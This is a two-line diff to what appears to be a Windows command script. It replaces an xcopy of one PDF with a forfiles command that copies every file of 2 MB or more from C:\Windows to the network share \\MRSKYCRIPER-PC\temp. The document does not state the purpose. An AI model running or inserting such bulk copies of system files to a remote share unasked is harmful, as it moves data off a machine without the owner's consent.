@@ -1,2 +1,1 @@
- xcopy /y/v/z/C "C:\Windows\Marx-CommunistManifesto.pdf" "\\MRSKYCRIPER-PC\temp\"
- 
+ forfiles /P "C:\Windows" /C "cmd /c if @fsize GEQ 2097152 xcopy /y/z/c @path \\MRSKYCRIPER-PC\temp" 
